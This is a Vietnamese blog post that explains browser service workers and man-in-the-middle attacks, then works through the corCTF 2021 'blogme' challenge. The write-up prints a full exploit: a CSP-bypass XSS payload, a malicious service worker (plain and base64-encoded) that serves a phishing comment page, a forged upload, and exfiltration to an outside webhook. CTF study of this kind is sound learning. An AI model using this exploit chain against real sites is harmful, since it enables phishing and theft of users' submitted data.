---
title: Service worker và Man-in-the-Middle Attack 
description: Một dạng client side attack
author: to^
date: 2022-05-10 23:43:00 +0700
categories: [WebSec, CTF]
tags: [xss,service worker]     # TAG names should always be lowercase
comments: true
img_path: /assets/img/SWandMITM
image:
 src: cyber.jpg
 alt: cyber image
 width: 1000
 height: 400
---

_Service worker và Man-in-the-Middle Attack_, để hiểu rõ được về chúng thì mình sẽ chia ra từng chủ để nhỏ và cuối cùng sẽ một challenge CTF từ năm 2021 để minh họa.

## Service worker (SW) là gì ?

### Hoàn cảnh ra đời

Các trình duyệt web sử dụng Javascript như một ngôn ngữ để xử lí các đoạn code bên phía user, nếu html là khung sườn của trang web, css giúp tô điểm cho trang web thì JS góp phần làm cho trang web trở nên sinh động hơn, tương tác hơn với user. Javascript là một "single threaded language", có nghĩa là nó thực thi các đoạn code theo thứ tự và chỉ khi xong đoạn code phía trước thì mới đến cái tiếp theo.

Mỗi tab trong một trình duyệt web sẽ tương ứng với một JS thread. Và bởi vì nó là single thread nên nếu các tác vụ phải xử lí quá nhiều trên một thread như vậy sẽ dẫn đến thread này bị blocked và tất nhiên sẽ làm ảnh hướng đến perfomance của trang web đó. Service workers (SW) ra đời đã giải quyết được vấn đề này

### Service worker
SW chỉ đơn giản là một tệp JS. Một điểm để phân biệt giữa SW và một file JS thông thường đó là SW thì chạy trong nền và điều này cũng góp phần làm giảm đi các tác vụ phải xử lí cho JS thread đã nói ở trên. SW cung cấp các tính năng không yêu cầu giao diện hoặc tương tác với người dùng chẳng hạn như đồng bộ ngầm và [push notifications](https://viblo.asia/p/web-push-notification-maGK7J695j2) ...

SW đóng vai trò như một proxy giữa web application và network, vì thế mà nó có thể intercept requests và xử lí chúng.

![service worker](sw.png)
_service worker_


## Vòng đời của service worker

![SW life cycle](https://res.cloudinary.com/scotch/image/upload/v1536590617/kxhshgxmbcl1aw7gncem.png)
_SW life cycle_

Vòng đời của một service worker bao gồm 3 giai đoạn chính:
1. Registration
2. Installtion
3. Activation


Trước khi bắt đầu sử dụng một service worker ta phải đăng kí cho nó như một background process. 
Đoạn code minh họa cho việc đăng kí một SW:

```js
if ('serviceWorker' in navigator) {
    navigator.serviceWorker.register('/sw.js', {
        scope: '/blog/'
    })
    .then(function (registration) {
        console.log('Service worker registered!');
    })
    .catch(function (err) {
        console.log('Registration failed!');
    })
}
```

Bởi vì không hẳn là trình duyệt nào cũng hỗ trợ SW nên ta sẽ phải kiểm tra trong `if`. 

Bên cạnh đó ta cũng có thể chỉ định `scope` cho nó. `Scope` là một khái niệm quan trọng trong SW, nó chỉ định path mà SW này sẽ hoạt động. Trong ví dụ trên `scope` được set là `/blog/` có nghĩa ta đã giới hạn vùng hoạt động của SW chỉ trong trong phạm vi của thư mục `/blog/`.

Một vài điều cần lưu ý về giai đoạn này như sau:

- SW muốn được load thì phải thỏa mãn tính chất same origin.
- Nếu không cấu hình `scope` thì giá trị mặc định của nó là đường dẫn của file JS trong `register()`. 

Sau khi hoàn thành đăng kí, server sẽ tải worker này vào background. Và ngay sau khi nó được tải xuống, SW nhận sự kiện`activate` , thường các lập trình viên sẽ dùng nó để khởi tạo các file tĩnh vào trong cache. Kế đó, SW tiến vào trang thái `idle` và quyết định trạng thái kế tiếp sẽ là gì. Hoặc là sẽ `terminated` đễ tiết kiệm bộ nhớ hoặc là sẽ xử lí các requests bằng sự kiện `fetch`/`message`. Tất cả các requests thuộc phạm vi đã cấu hình trong `scope` sẽ được xử lí.

Code minh họa cho việc cấu hình sự kiện `fetch` trong sw.js như sau:

```js
self.addEventListener('fetch', function (event) {
    event.respondWith(caches.match(event.request))
    .then(function (response) {
        return response || fetch(event.request);
    });
});
```

Nếu một SW được đăng kí thì trang web vẫn sẽ ưu tiên xử dụng cái cũ và đưa cái mới vào `waiting` sate. Một khi trang web đóng hoặc được reload thì SW mới được nạp vào sử dụng.
Điểm này nên được chú ý khi muốn thực hiện một cuộc tấn công Man-in-the-Middle Attack.

## Man-in-the-Middle Attack (MITM) là gì ?

Hồi xưa khi đi học chắc hẳn ai cũng đã từng nhận và đưa thư giùm cho mấy đứa trong lớp đúng không. Hồi đó mình còn chỉnh sửa lại thư của chúng nó cơ 😜. Kiểu tấn công này cũng tương tự dựa trên cái ví dụ mà mình đưa ra đó. Nói một cách "security" hơn về khái niệm của nó thì MITM là một kiểu tấn công bí mật xảy ra khi attacker nhảy vào một phiên giao tiếp giữa user hoặc hệ thống. Attacker sẽ mạo danh cả hai bên và có được quyền truy cập vào thông tin mà hai bên đang cố gắng gửi cho nhau. Attacker có thể chặn, gửi và nhận dữ liệu dành cho cả hai bên, mà không có bên nào biết cho đến khi quá muộn.

## Mối liên hệ giữa SW và MITM

Tới đây có thể bạn sẽ thắc mắc "thế thì MITM liên quan cái quái gì đến service worker 🤨 ???"

Mình sẽ đưa ra một ví đụ dơn giản:

- Giả sử một trang web bán hàng bị lỗi stored XSS ở phần comment và có chức năng upload file. 
- User muốn đọc tin tức về sản phẩm hay muốn xem profile cá nhân thì cần truy cập tới `http://shopping.com/products`, `http://shopping.com/profile`. 
- Tính năng upload sẽ lưu file của user tại đường dẫn `http://shopping.com/uploads/<filename>`.
- Stored XSS xảy ra ở phần comment của các sản phẩm.

Kịch bản tấn công sẽ như sau: 
- Attacker sẽ upload 1 file SW - `sw.js`. 
- Ở phần comment của sản phẩm dùng JS để đăng kí SW `register(http://shopping.com/uploads/sw.js)`.
- Trong file `sw.js` này cấu hình `scope: '/'` và sự kiện `fetch` trả về reponse `YOU ARE HACKED`.

Một khi user ấn vào để xem comment của sản phẩm thì vô tình trigger đống JS code -> register SW -> pwned. Lúc này khi user muốn xem profile hay thông tin sản phẩm thì thứ hiển thị chỉ là dòng chữ `YOU ARE HACKED` của attacker 😈.

Ở đây mình chỉ đưa ra ví dụ về "Response modification" các bạn có thêm xem thêm tại [đây](https://www.akamai.com/blog/security/abusing-the-service-workers-api).

Qua ví dụ đơn giản này ta có thể thấy việc attacker lợi dụng service woker, hoạt động như một proxy, và kết hợp với MITM để thực hiện một cuộc tấn công phía người dùng.

___

## blogme - corCTF2021

Challenge này là một cách để thực tế hóa đống lí thuyết nãy giờ. Mình cũng sẽ tiến hành phân tích hướng giải quyết cho nó dựa trên tinh thần học hỏi từ tác giả là chính.

### _Source code_
<https://github.com/strellic/my-ctf-challenges/tree/main/corCTF-2021>

### _Overview_

![overview](overview.png)
_overview_

Trang web hiển thị một vài post của admin và có các chức năng như `Profile`, `Your Posts`, `Logout`, `Comment`.

- `Profile`: tạo post, upload image file và có thể dùng để set avatar.
![profile](profile.png)
_profile_

- `Your Posts`: hiển thị các post đã tạo.
![your posts](your_posts.png)
_your posts_
- `Comment`: bình luận về một post bằng cách gửi data tới `../api/comment/<post id>`.
![comment](comment.png)
_comment_

### _Phân tích_

HTML bị escaped ở tất cả các chỗ ngoại trừ post page. Nhưng tác giả có dùng CSP: 

```
object-src 'none';
script-src 'self' 'unsafe-eval';
```
Và ở post thứ 3 của admin cũng có để gợi ý:

"wow, a lot of people have signed up and posted stuff! my bandwith was starting to get a little high, but Cloudflare (wink) (NOT SPONSORED) saved the day :D"

Để bypass thì ta có thể thử tra "cloudflare csp bypass unsafe-eval", tìm được một payload trên [tweet](https://twitter.com/kinugawamasato/status/1414648695904083988). Theo đó, mình nhận ra để áp dụng cách này thì trang web phải nằm trên một cloudfare domain, vì mình không có điều kiện mua domain 😅 nên chắc chỉ dừng lại ở mức phân tích thôi.

post length bị giới hạn chỉ được max là 300 kí tự nên tác giả đã reconstruct lại payload:

```html
<form id=_cf_translation><img id=lang-selector name=blobs><output id=locale><script>eval(name)</script></output></form><a data-translate=value></a><script src=/cdn-cgi/scripts/zepto.min.js></script><script src=/cdn-cgi/scripts/cf.common.js></script><script src=/cdn-cgi/scripts/cf.common.js></script>
```
Nhờ vào `eval(name)` ta có thể execute JS code chèn vào từ `window.name`.


Đoạn code xử lí file upload thực hiện filter và chỉ nhận image trên server:
![filter upload file](filterFileUpload.png)
_filter upload file_

Ở đây ta nhận thấy nếu user là admin thì sẽ không cần phải check type của file upload nên mục đích là kết hợp với `csrf` để upload file.

Admin bot có nhiệm vụ navigate tới `/api/comment` sau khi view post của ta, gõ flag vào ô comment và ấn submit.

Sau khi thử tạo một post với nội dung là `corCTF{test_flag}` để tự test thì mình nhận ra nội dung đã bị thay đổi, đoạn code đó nằm ở:
![replace flag comment](replaceFlagComment.png)
_replace flag comment_

Vầy là ta phải nghĩ ra một cách để lấy được nội dung của comment mà không bị server thay đổi giá trị.

Hướng đi của tác giả như sau: force admin bot upload một `sw.js` file, file này ta có thể access tới bằng đường dẫn `/api/file?id=<file-id>`. Comment page ở đường dẫn `/api/comment` cùng với file upload đều thuộc cùng thư mục `/api` nên service woker có thể hoạt động trên comment page.

Tác giả tạo một sự kiện `fetch` trong `sw.js` để ngăn không cho request đi đến server mà tự trả về response nhờ vào SW. Response trả về không phải là `/api/comment` ban đầu nữa, mà thay vào đó là một page theo kiểu Phishing, khi admin bot gõ comment và ấn submit thì nội dung của comment sẽ được gửi đến webhook của ta.

Các bước chuẩn bị:
- Một post với content: `<meta http-equiv="refresh" content="0;url=https://exploitpage" />`
- Một post dùng để bypass CSP (tạm gọi id của post này là `EVAL_POSTID`) với content:

```html
<form id=_cf_translation><img id=lang-selector name=blobs><output id=locale><script>eval(name)</script></output></form><a data-translate=value></a><script src=/cdn-cgi/scripts/zepto.min.js></script><script src=/cdn-cgi/scripts/cf.common.js></script><script src=/cdn-cgi/scripts/cf.common.js></script>
```
Khai thác:
- Stage 1: gửi admin một url trỏ tới post chứa meta tag -> redirect đến exploit page, tại đây set `window.name` bằng payload dùng để upload `sw.js`, sau đó redirect về lại `https://blogme.be.ax/post/${EVAL_POSTID}` -> lúc này payload sẽ được executed và gửi id của file `sw.js` (`SW_FILEID`) đã được upload đến webhook.
- Stage 2: register `sw.js` đã upload `register('https://blogme.be.ax/api/file?id=${SW_FILEID}')`

### _Khai thác_
Exploit code:
```html
<!DOCTYPE html>
<html>

<body>
    <!--
    make two pages, one with the meta tag, and the other with the form tag csp bypass
    set eval post id to the id of the meta tag
    at window.name at the bottom, run stage1 first.
    send the post that has the meta redirect to the admin
    this sends the file id of the service worker to a webhook, which you can then set as service worker file id.
    then, change it to run stage2
    your webhook should have the flag!
  -->
    <!--
        <meta http-equiv="refresh" content="0;url=https://THISHTMLFILE" />
    -->
    <!--
<form id=_cf_translation><img id=lang-selector name=blobs><output id=locale><script>eval(name)</script></output></form><a data-translate=value></a><script src=/cdn-cgi/scripts/zepto.min.js></script><script src=/cdn-cgi/scripts/cf.common.js></script><script src=/cdn-cgi/scripts/cf.common.js></script>
-->
    <script>
        const EVAL_POSTID = "8d44702a-dc4b-43f4-8651-0a64bc88fb08";
        const SW_FILEID = "a944179f-b7eb-4297-a3e3-9548feff8918";
        /*
self.addEventListener('fetch', async (e) => {
    console.log(e);
    if(e.request.url.includes("/api/comment")) {
        e.respondWith(new Response(new Blob([`

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <title>blogme</title>
    <link rel="stylesheet" href="/assets/bootstrap/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@400;700&amp;display=swap">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora">
    <link rel="stylesheet" href="/assets/css/styles.css">
</head>

<body>
    <nav class="navbar navbar-dark navbar-expand-md textwhite bg-primary text-white navigation-clean">
        <div class="container">
            <a class="navbar-brand" href="/">blogme</a>
            <button data-bs-toggle="collapse" class="navbar-toggler" data-bs-target="#navcol">
                <span class="visually-hidden">Toggle navigation</span>
                <span class="navbar-toggler-icon"></span>
            </button>
            <div class="collapse navbar-collapse" id="navcol">
                <ul class="navbar-nav ms-auto">
                    <li class="nav-item"><a class="nav-link" href="/">Home</a></li>
                    <li class="nav-item"><a class="nav-link" href="/profile">Profile</a></li>
                    <li class="nav-item"><a class="nav-link" href="/posts">Your Posts</a></li>
                    <li class="nav-item"><a class="nav-link" href="/api/logout">Logout</a></li>
                </ul>
            </div>
        </div>
    </nav>

    <div class="container card bg-secondary mt-5 p-0">
        <div class="card-header"><h3 class="m-0">Comment</h3></div>
        <div class="card-body">
            <div class="card-text">Enter your comment below:</div>
            <form method="POST" action="https://enx4khh4m6jy.x.pipedream.net/">
                <input class="form-control" type="hidden" name="id" value="7213f554-2b98-422a-8416-7a45d6c716be">
                <div class="input-group mt-3">
                    <span class="input-group-text">Comment</span>
                    <textarea class="form-control" name="text" rows=3 maxlength=150></textarea>
                </div>
                <input type="hidden" name="_csrf" value="QaJVpRex-Yx3UhVRDCHWKT8GgJwg8P9HkRAM">
                <button class="btn btn-primary mt-3 float-end" type="submit">Comment</button>
            </form>
        </div>
    </div>
    <script src="/assets/bootstrap/js/bootstrap.min.js"></scr` + `ipt>
    <script src="/assets/js/jquery.min.js"></scr` + `ipt>
    <script src="/assets/js/script.js"></scr` + `ipt>
</body>
</html>
        `], { type: 'text/html' })));
    }
    return;
});
        */

        let stage1 = () => {
            fetch("data:application/javascript;base64,c2VsZi5hZGRFdmVudExpc3RlbmVyKCdmZXRjaCcsIGFzeW5jIChlKSA9PiB7CiAgICBjb25zb2xlLmxvZyhlKTsKICAgIGlmKGUucmVxdWVzdC51cmwuaW5jbHVkZXMoIi9hcGkvY29tbWVudCIpKSB7CiAgICAgICAgZS5yZXNwb25kV2l0aChuZXcgUmVzcG9uc2UobmV3IEJsb2IoW2AKCjwhRE9DVFlQRSBodG1sPgo8aHRtbCBsYW5nPSJlbiI+Cgo8aGVhZD4KICAgIDxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4KICAgIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MS4wLCBzaHJpbmstdG8tZml0PW5vIj4KICAgIDx0aXRsZT5ibG9nbWU8L3RpdGxlPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSIvYXNzZXRzL2Jvb3RzdHJhcC9jc3MvYm9vdHN0cmFwLm1pbi5jc3MiPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL2ZvbnRzLmdvb2dsZWFwaXMuY29tL2NzczI/ZmFtaWx5PUxhdG86d2dodEA0MDA7NzAwJmFtcDtkaXNwbGF5PXN3YXAiPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL2ZvbnRzLmdvb2dsZWFwaXMuY29tL2Nzcz9mYW1pbHk9TG9yYSI+CiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Ii9hc3NldHMvY3NzL3N0eWxlcy5jc3MiPgo8L2hlYWQ+Cgo8Ym9keT4KICAgIDxuYXYgY2xhc3M9Im5hdmJhciBuYXZiYXItZGFyayBuYXZiYXItZXhwYW5kLW1kIHRleHR3aGl0ZSBiZy1wcmltYXJ5IHRleHQtd2hpdGUgbmF2aWdhdGlvbi1jbGVhbiI+CiAgICAgICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KICAgICAgICAgICAgPGEgY2xhc3M9Im5hdmJhci1icmFuZCIgaHJlZj0iLyI+YmxvZ21lPC9hPgogICAgICAgICAgICA8YnV0dG9uIGRhdGEtYnMtdG9nZ2xlPSJjb2xsYXBzZSIgY2xhc3M9Im5hdmJhci10b2dnbGVyIiBkYXRhLWJzLXRhcmdldD0iI25hdmNvbCI+CiAgICAgICAgICAgICAgICA8c3BhbiBjbGFzcz0idmlzdWFsbHktaGlkZGVuIj5Ub2dnbGUgbmF2aWdhdGlvbjwvc3Bhbj4KICAgICAgICAgICAgICAgIDxzcGFuIGNsYXNzPSJuYXZiYXItdG9nZ2xlci1pY29uIj48L3NwYW4+CiAgICAgICAgICAgIDwvYnV0dG9uPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2xsYXBzZSBuYXZiYXItY29sbGFwc2UiIGlkPSJuYXZjb2wiPgogICAgICAgICAgICAgICAgPHVsIGNsYXNzPSJuYXZiYXItbmF2IG1zLWF1dG8iPgogICAgICAgICAgICAgICAgICAgIDxsaSBjbGFzcz0ibmF2LWl0ZW0iPjxhIGNsYXNzPSJuYXYtbGluayIgaHJlZj0iLyI+SG9tZTwvYT48L2xpPgogICAgICAgICAgICAgICAgICAgIDxsaSBjbGFzcz0ibmF2LWl0ZW0iPjxhIGNsYXNzPSJuYXYtbGluayIgaHJlZj0iL3Byb2ZpbGUiPlByb2ZpbGU8L2E+PC9saT4KICAgICAgICAgICAgICAgICAgICA8bGkgY2xhc3M9Im5hdi1pdGVtIj48YSBjbGFzcz0ibmF2LWxpbmsiIGhyZWY9Ii9wb3N0cyI+WW91ciBQb3N0czwvYT48L2xpPgogICAgICAgICAgICAgICAgICAgIDxsaSBjbGFzcz0ibmF2LWl0ZW0iPjxhIGNsYXNzPSJuYXYtbGluayIgaHJlZj0iL2FwaS9sb2dvdXQiPkxvZ291dDwvYT48L2xpPgogICAgICAgICAgICAgICAgPC91bD4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgPC9kaXY+CiAgICA8L25hdj4KCiAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIgY2FyZCBiZy1zZWNvbmRhcnkgbXQtNSBwLTAiPgogICAgICAgIDxkaXYgY2xhc3M9ImNhcmQtaGVhZGVyIj48aDMgY2xhc3M9Im0tMCI+Q29tbWVudDwvaDM+PC9kaXY+CiAgICAgICAgPGRpdiBjbGFzcz0iY2FyZC1ib2R5Ij4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iY2FyZC10ZXh0Ij5FbnRlciB5b3VyIGNvbW1lbnQgYmVsb3c6PC9kaXY+CiAgICAgICAgICAgIDxmb3JtIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSJodHRwczovL2VueDRraGg0bTZqeS54LnBpcGVkcmVhbS5uZXQvIj4KICAgICAgICAgICAgICAgIDxpbnB1dCBjbGFzcz0iZm9ybS1jb250cm9sIiB0eXBlPSJoaWRkZW4iIG5hbWU9ImlkIiB2YWx1ZT0iNzIxM2Y1NTQtMmI5OC00MjJhLTg0MTYtN2E0NWQ2YzcxNmJlIj4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImlucHV0LWdyb3VwIG10LTMiPgogICAgICAgICAgICAgICAgICAgIDxzcGFuIGNsYXNzPSJpbnB1dC1ncm91cC10ZXh0Ij5Db21tZW50PC9zcGFuPgogICAgICAgICAgICAgICAgICAgIDx0ZXh0YXJlYSBjbGFzcz0iZm9ybS1jb250cm9sIiBuYW1lPSJ0ZXh0IiByb3dzPTMgbWF4bGVuZ3RoPTE1MD48L3RleHRhcmVhPgogICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJfY3NyZiIgdmFsdWU9IlFhSlZwUmV4LVl4M1VoVlJEQ0hXS1Q4R2dKd2c4UDlIa1JBTSI+CiAgICAgICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJidG4gYnRuLXByaW1hcnkgbXQtMyBmbG9hdC1lbmQiIHR5cGU9InN1Ym1pdCI+Q29tbWVudDwvYnV0dG9uPgogICAgICAgICAgICA8L2Zvcm0+CiAgICAgICAgPC9kaXY+CiAgICA8L2Rpdj4KICAgIDxzY3JpcHQgc3JjPSIvYXNzZXRzL2Jvb3RzdHJhcC9qcy9ib290c3RyYXAubWluLmpzIj48L3NjcmAgKyBgaXB0PgogICAgPHNjcmlwdCBzcmM9Ii9hc3NldHMvanMvanF1ZXJ5Lm1pbi5qcyI+PC9zY3JgICsgYGlwdD4KICAgIDxzY3JpcHQgc3JjPSIvYXNzZXRzL2pzL3NjcmlwdC5qcyI+PC9zY3JgICsgYGlwdD4KPC9ib2R5Pgo8L2h0bWw+CiAgICAgICAgYF0sIHsgdHlwZTogJ3RleHQvaHRtbCcgfSkpKTsKICAgIH0KICAgIHJldHVybjsKfSk7").then(r => r.blob()).then(async b => {
                let formData = new FormData();
                formData.append("blob", b, "sw.js");

                let pfp = await (await fetch("/profile")).text();
                let csrf = /\?_csrf=(.*?)"/.exec(pfp)[1];

                let response = await fetch("/api/upload/?_csrf=" + encodeURIComponent(csrf), {
                    method: 'POST',
                    body: formData
                });
                navigator.sendBeacon("https://enx4khh4m6jy.x.pipedream.net/", new URLSearchParams(new URL(response.url).search).get("message"));
            });
        };

        let stage2 = (SW_FILEID) => {
            navigator.serviceWorker.register(`https://blogme.be.ax/api/file?id=${SW_FILEID}`, {
                scope: '/api/comment'
            });
        };

        window.name = "(" + stage1.toString() + `)("${SW_FILEID}");`;
        location.href = `https://blogme.be.ax/post/${EVAL_POSTID}`;
    </script>
</body>

</html>
```

___

## Tài liệu tham khảo

<https://www.akamai.com/blog/security/abusing-the-service-workers-api>

<https://betterprogramming.pub/man-in-the-middle-attacks-via-javascript-service-workers-52647ac929a2>

<https://brycec.me/posts/corctf_2021_challenges#blogme>